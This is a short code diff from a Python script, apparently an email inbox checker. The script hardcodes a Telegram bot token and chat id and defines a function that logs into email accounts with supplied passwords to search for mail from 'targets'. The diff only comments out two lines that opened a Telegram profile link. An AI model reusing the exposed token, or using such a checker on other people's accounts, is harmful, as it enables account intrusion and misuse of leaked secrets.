@@ -8,8 +8,8 @@ import webbrowser
 token = '7304792372:AAFXSvIGN8nMN-oPYc8_5dyO3-UnDcBUjkg'
 id = '5372825497'
 uidos = '━━━━━━━━[𝗜𝗡𝗕𝗢𝗫 📥]━━━━━━━━'
-webbrowser.open("https://t.me/fahimhossen27")
-os.system('xdg-open https://t.mefahimhossen27')
+#webbrowser.open("https://t.me/fahimhossen27")
+#os.system('xdg-open https://t.mefahimhossen27')
 # Function to log into an email account and search for emails from specific targets
 def check_email_inbox(email_user, email_pass, targets):
 	
